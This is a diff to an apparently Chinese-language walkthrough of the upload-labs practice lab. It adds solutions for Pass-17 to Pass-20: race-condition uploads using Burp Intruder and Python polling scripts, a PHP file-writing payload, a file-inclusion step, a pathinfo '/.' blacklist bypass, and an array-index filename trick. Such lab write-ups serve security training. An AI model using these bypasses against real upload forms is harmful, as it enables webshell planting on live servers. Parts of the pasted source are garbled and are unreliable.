@@ -2,9 +2,11 @@ https://github.com/c0ny1/upload-labs
 
 参考
 
+https://blog.csdn.net/weixin_44426869/article/details/104236854#t3
 https://xz.aliyun.com/t/2435
 https://www.cnblogs.com/Lmg66/p/13272575.html?utm_source=tuicool
 https://blog.csdn.net/weixin_44677409/article/details/92799366#t17
+
 
 文件上传漏洞练习
 
@@ -716,12 +718,301 @@ imagexxx — 以 xxx 格式将图像输出到浏览器或文件
         }
     }
 
-这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则通过rename重命名，否则通过unlink删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可。
 
-在判断删除前，进行访问，竞争时间。
+这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则通过rename重命名，否则通过unlink删除
 
-## Pass-18
+因此我们可以上传shell.php只需要在它删除之前访问即可，可以利用burp的intruder模块（重放攻击）不断上传，然后我们不断的访问刷新该地址即可。
 
-## Pass-19
+先创建一个shell.php，内容为
+
+    <?php
+        fputs(fopen('phpinfo.php','w'),'<?php phpinfo(); ?>');
+    ?>
+
+再使用python不断请求
+
+    import requests
+    url = "http://127.0.0.1/upload/shell.php"
+    while True:
+        html = requests.get(url)
+        if html.status_code == 200:
+            print("OK")
+            break
+        else:
+            print("NO")
+
+运行python代码，再用burpsuite-intruder模块批量模拟上传shell.php文件，Tips:intruder模块中，payload选择Null payloads，并且可以选择无限重复，线程也可以根据实际情况加大。
+
+若是脚本结果出现ok，则说明访问到了shell.php，并且生成了phpinfo.php，可以访问到 http://127.0.0.1/upload/phpinfo.php
+
+如果不写脚本，也可以利用burpsuite-intruder模块一并模拟访问包，或者直接浏览器刷新。
+
+
+## Pass-18 条件竞争
+
+源码"shell_phpinfo.jpg
+    {
+        require_once("./myupload.php");
+        $imgFileName =time();
+        $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
+        $status_code = $u->upload(UPLOAD_PATH);
+        switch ($status_code) {
+            case 1:
+                $is_upload = true;
+                $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
+                break;
+            case 2:
+                $msg = '文件已经被上传，但没有重命名。';
+                break; 
+            case -1:
+                $msg = '这个文件不能上传到服务器的临时文件存储目录。';
+                break; 
+            case -2:
+                $msg = '上传失败，上传目录不可写。';
+                break; 
+            case -3:
+                $msg = '上传失败，无法上传该类型文件。';
+                break; 
+            case -4:
+                $msg = '上传失败，上传的文件过大。';
+                break; 
+            case -5:
+                $msg = '上传失败，服务器已经存在相同名称文件。';
+                break; 
+            case -6:
+                $msg = '文件无法上传，文件不能复制到目标目录。';
+                break;      
+            default:
+                $msg = '未知错误！';
+                break;
+        }
+    }
+
+    //myupload.php
+    class MyUpload{
+    ......
+    ......
+    ...... 本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功：
+    **
+    ** Method to upload the file.
+    ** This is the only method to call outside the class.
+    ** @para String name of directory we upload to
+    ** @returns void
+    **/
+    function upload( $dir ){
+        "shell_phpinfo.jpg
+        return $this->resultUpload( $ret );
+        }
+
+        $ret = $this->setDir( $dir );
+        if( $ret != 1 ){
+        return $this->resultUpload( $ret );
+        }
+
+        $ret = $this->checkExtension();
+        if( $ret != 1 ){
+        return $this->resultUpload( $ret );
+        }
+
+        $ret = $this->checkSize();
+        if( $ret != 1 ){
+        return $this->resultUpload( $ret );    
+        }
+        
+        // if flag to check if the file exists is set to 1
+        
+        if( $this->cls_file_exists == 1 ){
+        
+        $ret = $this->checkFileExists();
+        if( $ret != 1 ){
+            return $this->resultUpload( $ret );    
+        }
+        }
+
+        // if we are here, we are ready to move the file to destination
+
+        $ret = $this->move();
+        if( $ret != 1 ){
+        return $this->resultUpload( $ret );    
+        }
+
+        // check if we need to rename the file
+
+        if( $this->cls_rename_file == 1 ){
+        $ret = $this->renameFile();
+        if( $ret != 1 ){
+            return $this->resultUpload( $ret );    
+        }
+        }
+        
+        // if we are here, everything worked as planned :)
+
+        return $this->resultUpload( "SUCCESS" );
+    
+    }
+    ......
+    ......
+    ...... 
+    };
+
+本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。
+
+题目bug，index.php中 $status_code = $u->upload(UPLOAD_PATH); 改成 $status_code = $u->upload(UPLOAD_PATH+“/”);
+
+制作图片马shell_phpinfo.jpg，图片马作用是生成phpinfo.php
+
+    <?php fputs(fopen('phpinfo.php','w'),'<?php phpinfo(); ?>');?>
+
+编写脚本1.py
+
+    import requests
+    url = "http://127.0.0.1/upload/shell_phpinfo.jpg"
+    while True:
+        html = requests.get(url)
+        if html.status_code == 200:
+            print("OK")
+            break
+        else:
+            print("NO")
+
+同Pass-18，运行1.py,bp重放攻击，可以访问竞争到shell_phpinfo.jpg文件
+
+再文件包含利用，编写脚本2.py
+
+    import requests
+    url = "http://127.0.0.1/include.php?file=./upload/shell_phpinfo.jpg"
+    while True:
+        html = requests.get(url)
+        if 'phpinfo()' in html.text:
+            print("OK")
+            break
+        else:
+            print("NO")
+
+运行2.py,bp重放攻击，生成了phpinfo.php
+
+## Pass-19 /.绕过
+
+源码
+
+    $is_upload = false;
+    $msg = null;
+    if (isset($_POST['submit'])) {
+        if (file_exists(UPLOAD_PATH)) {
+            $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");
+
+            $file_name = $_POST['save_name'];
+            $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+            if(!in_array($file_ext,$deny_ext)) {
+                $temp_file = $_FILES['upload_file']['tmp_name'];
+                $img_path = UPLOAD_PATH . '/' .$file_name;
+                if (move_uploaded_file($temp_file, $img_path)) { 
+                    $is_upload = true;
+                }else{
+                    $msg = '上传出错！';
+                }
+            }else{
+                $msg = '禁止保存为该类型文件！';
+            }
+
+        } else {
+            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+        }
+    }
+
+绕过姿势：Pathinfo()会返回一个关联数组含有path的信息。例如：
+
+![](https://lnng.top/img/66.png)
+
+save_name=shell.php/.这样file_ext值为空绕过黑名单，而move_uploaded_file函数忽略文件后的./就可以实现保存文件为shell.php
+
+直接加一个.号也可以绕过
+
+![](https://lmg66.github.io/img/67.png)
 
 ## Pass-20
+
+源码
+
+    $is_upload = false;
+    $msg = null;
+    if(!empty($_FILES['upload_file'])){
+        //检查MIME
+        $allow_type = array('image/jpeg','image/png','image/gif');
+        if(!in_array($_FILES['upload_file']['type'],$allow_type)){
+            $msg = "禁止上传该类型文件!";
+        }else{
+            //检查文件名
+            $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+            if (!is_array($file)) {
+                $file = explode('.', strtolower($file));
+            }
+
+            $ext = end($file);
+            $allow_suffix = array('jpg','png','gif');
+            if (!in_array($ext, $allow_suffix)) {
+                $msg = "禁止上传该后缀文件!";
+            }else{
+                $file_name = reset($file) . '.' . $file[count($file) - 1];
+                $temp_file = $_FILES['upload_file']['tmp_name'];
+                $img_path = UPLOAD_PATH . '/' .$file_name;
+                if (move_uploaded_file($temp_file, $img_path)) {
+                    $msg = "文件上传成功！";
+                    $is_upload = true;
+                } else {
+                    $msg = "文件上传失败！";
+                }
+            }
+        }
+    }else{
+        $msg = "请选择要上传的文件！";
+    }
+
+先检查MIME，通过后检查文件名，保存名称为空的就用上传的文件名。再判断文件名是否是array数组，不是的话就用explode()函数通过.号分割成数组。然后获取最后一个，也就是后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。
+
+
+    explode(string $delimiter , string $string [, int $limit])//返回由字符串组成的数组，每个元素都是string的一个子串，它们被字符串delimiter作为边界点分割出来 
+    reset(array &$array)//将数组的内部指针指向第一个单元
+    end() 把数组内部指针移动到数组最后一个元素，并返回值。
+    count()函数数组元素的数量。
+
+通过$file_name = reset($file) . '.' . $file[count($file) - 1];可以知道最终的文件名是由数组的第一个和最后一个元素拼接而成。如果是正常思维来讲，无论如何都是没有办法绕过的，但是有个地方给了一个提示。
+
+    if (!is_array($file)) {
+        $file = explode('.', strtolower($file));
+    }
+
+这里有个判断，如果不是数组，就自己拆成数组，也就是说，我们是可以自己传数组进入的。
+
+如果第一个元素是reset()，最后一个元素是end()，讲道理 $file[count($file)-1] 也就是最后一个，但是为什么不直接使用end()呢
+
+也就是说有特殊的情况下，这两个东西是不等的，其实就是这样的一个数组
+
+$array=([0]->'shell' [2]->'php' [3]->'jpg')
+
+测试代码
+
+    <?php
+    $file = array();
+    $file[0] = 'shell';
+    $file[2] = 'php';
+    $file[3] = 'jpg';
+    print_r($file);
+    echo "数组总元素个数为".count($file);
+    ?>
+
+
+运行结果
+
+    Array
+    (
+        [0] => shell
+        [2] => php
+        [3] => jpg
+    )
+    数组总元素个数为3
+
+绕过姿势：
+
+![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/Screenshot%20from%202021-05-21%2001-56-52.png)
